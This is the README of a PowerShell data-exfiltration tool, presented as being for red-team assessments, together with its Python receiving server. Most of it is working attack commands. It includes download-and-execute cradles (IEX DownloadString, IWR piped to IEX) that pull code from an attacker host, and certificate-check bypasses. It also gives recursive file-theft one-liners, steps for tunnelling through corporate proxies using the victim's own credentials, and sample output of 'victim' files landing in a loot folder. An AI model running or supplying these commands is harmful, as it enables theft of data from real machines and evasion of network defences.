# Invoke-WebExfiltration
Exfiltrate data via PowerShell HTTP(s) POST request (with file gzip compression and AES-256 encryption)


# Description
Invoke-WebExfiltration is a convenience tools which makes exfiltrating files via PowerShell to a remote server a bit easier during Red Team assessments (or similar). 
Data is transferred via HTTP(S) POST requests, with a JSON body containing the information.
All data is AES-256 encrypted which makes file exfiltration even via HTTP secure. 
Furthermore, even with TLS stripping the firewall / proxy can't see what data is being transferred. 

Files can also be exfiltrated through a web proxy (with none, NTLM, Kerberos or Basic Authentication)

# Features
- Proxy support: none, NTLM, Kerberos or Basic Authentication
- Easy to use
- Strong AES-256 encryption
- Gzip compression


# Technical details / design thoughts

- File encryption
  - File names and file content is encrypted with AES-256
  - Key size: 256 bit, block size: 128 bit, IV: 128 bit, PKCS7 padding
  - The password is SHA256 hashed to receive a 256 bit long key
  - This means that it is even safe to transfer files via plain text HTTP (assuming you use a strong password)

- Gzip compression
  - After encryption the binary data is compressed via Gzip.
  - Compression is fast for not too large files and reduces the size by a good few percent
  
- Base64 encoding
  - The encrypted, compress binary data is base64 encoded for transfer via HTTP(s) POST request 

- No password protection for file upload
  - The server will only accept data from POST requests from which it can which can successfully decrypt the cipher text.
  - It tests that first on the file name.
  - If the content can't be decrypted the file name the file binary will be ignored and is discarded.
  - I kind of see that as a password protection 'light' for the file upload to prevent unwanted uploads from 3rd parties.

- Loot folder structure
  - The tool keeps the identical folder structure as it exists on the client
  - The folder will loots dir for the device will be named after the connection IP_HOSTNAME_WINDOWS-VERSION_USERNAME

- No direct proxy support
  - The tools has no direct proxy support as there are too many scenarios 
  - The proxy environment should rather be setup in the current PowerShell session. 
  - See examples on how to do that

# ToDo:
- I'm unhappy with the way SSL/HTTPS is done. Needs improvement
- Add some sort of file upload restriction (Basic Auth?)

# Limitations
- Large files (100MB) should be split into chunks and then exfiltrated (see examples)
- It works, but takes ages. 
- Furthermore the whole file needs to be kept in memory by the server

# Help

## iwe-server.py
```bash
$ ./iwe-server.py --help
 _____  ____      ____  ________
|_   _||_  _|    |_  _||_   __  |
  | |    \ \  /\  / /    | |_ \_|
  | |     \ \/  \/ /     |  _| _
 _| |_     \  /\  /     _| |__/ |
|_____|     \/  \/     |________|

Invoke-WebExfiltration v0.2
by Philipp Rieth

usage: iwe-server.py [-h] [-a ADDRESS] [-p PORT] [-P PASSWORD] [-t TARGETDIR] [--crt CRT] [--key KEY] [--http] [--verbose]

Exfiltrate files to a remote server in a secure, encrypted way

optional arguments:
  -h, --help            show this help message and exit
  -a ADDRESS, --address ADDRESS
                        The domain, hostname or IP address that will be embedded into the PowerShell script.
                        Default: local IP address
  -p PORT, --port PORT  Listening port that will be used.
                        Default: 8000
  -P PASSWORD, --password PASSWORD
                        Password to use for decryption.
                        Default: generate random password
  -t TARGETDIR, --targetdir TARGETDIR
                        Loot directory to store the exfiltrated files in.
                        Default: '/home/phil/git/Invoke-WebExfiltration/loot/'
  --crt CRT             Path to custom certificate (.crt)
  --key KEY             Path to custom certificate private key (.key)
  --http                Use HTTP instead of HTTPS.
                        Default: HTTPS
  --verbose             Print verbose information on console.
                        Default: False
```

## Invoke-WebExfiltration.ps1
```powershell
PS > Get-Help Invoke-WebExfiltration

NAME
    Invoke-WebExfiltration

SYNOPSIS
    PowerShell function to exfiltrate data via HTTP(s) POST request
    (with file gzip compression and AES-256 encryption)
    Author: Philipp Rieth

SYNTAX
    Invoke-WebExfiltration [-File] <Object> [[-Target] <String>] [-Password <String>] [-Insecure] [<CommonParameters>]

RELATED LINKS
    GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration
    GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration

REMARKS
    To see the examples, type: "Get-Help Invoke-WebExfiltration -Examples"
    For more information, type: "Get-Help Invoke-WebExfiltration -Detailed"
    For technical information, type: "Get-Help Invoke-WebExfiltration -Full"
    For online help, type: "Get-Help Invoke-WebExfiltration -Online"
```

# Installation

## Linux
```bash
git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
cd Invoke-WebExfiltration

pip3 install virtualenv
virtualenv -p python3 venv
source venv/bin/active

pip install -r requirements.txt
```

## Windows
```powershell
git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
cd Invoke-WebExfiltration

pip3.exe install virtualenv
virtualenv.exe -p python3 venv
.\venv\Scripts\activate.ps1

pip install -r requirements.txt
```

# Usage & Examples
Server
```bash
$ ./iwe-server.py --address hackerman1337.net --port 8443

 _____  ____      ____  ________
|_   _||_  _|    |_  _||_   __  |
  | |    \ \  /\  / /    | |_ \_|
  | |     \ \/  \/ /     |  _| _
 _| |_     \  /\  /     _| |__/ |
|_____|     \/  \/     |________|

Invoke-WebExfiltration v0.2
by Philipp Rieth

URL:      https://hackerman1337.net:8443/
Password: Y84f2hFiAShv3Juw
Loot dir: /home/hackerman/git/Invoke-WebExfiltration/loot/

Copy any of the two into your PowerShell:
PS > IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net:8443/iwe')
PS > IWR -SkipCertificateCheck 'https://hackerman1337.net:8443/iwe' | IEX

Start exfiltrating files with:
PS > ls * | IEX

 * Serving Flask app 'iwe-server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on https://127.0.0.1:8443
 * Running on https://172.30.140.67:8443
Press CTRL+C to quit
```
Client
```powershell
PS > IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.102:8000/iwe')
PS > ls file* | IWE
[~] Target server: 'http://192.168.20.102:8000/sendfile'
[*] Password: ********
[+] Exfiltrating file 'C:\Users\victim\file.bin'
[+] Exfiltrating file 'C:\Users\victim\top-secret.csv'
[+] Exfiltrating file 'C:\Users\victim\dont-share.docx'
[~] All done!
```
Server 
```bash
$ find ./loot/ -type f
loot/192.168.20.102_VICTIM-PC-HOSTNAME_Microsoft_Windows_11_Pro_10.0.22000_user@domain.com/C/Users/victim/file.bin
loot/192.168.20.102_VICTIM-PC-HOSTNAME_Microsoft_Windows_11_Pro_10.0.22000_user@domain.com/C/Users/victim/top-secret.csv
loot/192.168.20.102_VICTIM-PC-HOSTNAME_Microsoft_Windows_11_Pro_10.0.22000_user@domain.com/C/Users/victim/dont-share.docx
```

## Load `IWE` into PowerShell 

HTTP
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://hackerman1337.net:8000/iwe')
```

HTTPS
```powershell
# Load via WebClient and certificate validation bypass. Does not work in pwsh.exe
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')

# Load via Invoke-WebRequest
IWR 'https://hackerman1337.net/iwe' | IEX

# Load via Invoke-WebRequest and certificate validation bypass
IWR 'https://hackerman1337.net/iwe' -SkipCertificateCheck | IEX
```

## Exfiltrate files

```powershell
# Exfiltrate single file
IWE -File .\file.bin

# Exfiltrate all files in current folder
ls | IWE

# Exfiltrate all files in current folder and ignore certificate errors
ls | IWE -Insecure

# Exfiltrate all files in curent dir starting with 
ls file* | IWE

# Exfiltrate all files and sub directories 
# 'ls * -Recurse' does not work as it doesn't return the full path of the files
ls * -Recurse | Select-Object -ExpandProperty FullName | IWE

# Define exfiltration password via parameter (not so secure but okay)
# Add space before command to prevent it from being save in the PowerShell histroy
ls file.txt | IWE -Verbose -Password Y84f2hFiAShv3Juw
```

## Load & use `IWE` with proxy 
Different proxy setup might be required depending on proxy authentication (NTLM, Kerberos, Basic Auth.)

1. Use system or custom proxy
2. Set proxy for current PowerShell session
3. Decide which proxy credentials to use (skip if no authentication is needed)
4. Decide if x509 certificate errors should be ignored
5. Use IWE as usual 
```powershell
# Set a proxy for the current PowerShell session

# 1. User system proxy
$proxyUri = New-Object System.Uri(([System.Net.WebProxy]::GetDefaultProxy()).Address.AbsoluteUri)
# 1. User custom proxy
$proxyUri = "http://yourProxy:8080"

# 2. Set the default web proxy all request in current PowerShell session
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($proxyUri, $true)

# 3. Use system default credentials (e.g. vor NTLM / Kerberos)
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

# 3. Use custom credentials for proxy (e.g. Basic Auth)
[System.Net.WebRequest]::DefaultWebProxy.Credentials = Get-Credential

# 4. Ignore certificate check (needed if self signed certificate is used)
# Does not work in pwsh.exe, use powershell.exe!
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# 5. Use IWE as usual
IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')
ls $HOME/Desktop | IWE
```

## Exfiltrate large files (split into chunks)
Large files (>100MB) should be split into smaller chunks.
- [Split-File.ps1](https://www.powershellgallery.com/packages/FileSplitter/1.3/Content/Split-File.ps1)
- [Join-File.ps1](https://www.powershellgallery.com/packages/FileSplitter/1.3/Content/Join-File.ps1)

```powershell
# Window client side
PS > Import-Module .\Split-File.ps1
PS > Split-File -Path .\large.zip -PartSizeBytes 50MB
PS > ls large.zip.* | IWE

# Linux server side, install PowerShell on Linux
$ sudo apt update
$ sudo apt install powershell
$ powershell
PS > Import-Module .\Join-File.ps1
PS > Join-File -Path "C:\large.zip"
```
